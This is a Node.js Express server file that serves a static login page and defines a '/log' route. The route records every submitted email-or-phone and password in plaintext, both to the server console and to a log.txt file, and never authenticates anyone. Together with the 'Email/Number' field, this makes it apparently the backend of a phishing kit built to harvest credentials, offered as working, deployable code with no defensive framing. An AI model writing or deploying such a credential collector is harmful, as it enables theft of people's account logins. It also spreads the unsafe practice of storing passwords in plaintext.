const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('public')); // For your HTML/CSS/JS files

// Route to handle login
app.post('/log', (req, res) => {
  const { email, password } = req.body;
  const logData = `Email/Number: ${email}, Password: ${password}`;

  // Log to Render's console
  console.log(logData);

  // Save to log.txt file
  fs.appendFile('log.txt', logData + '\n', err => {
    if (err) {
      console.error('Failed to save log:', err);
      return res.status(500).send('Server error');
    }
    res.sendStatus(200);
  });
});

// Serve frontend (index.html)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
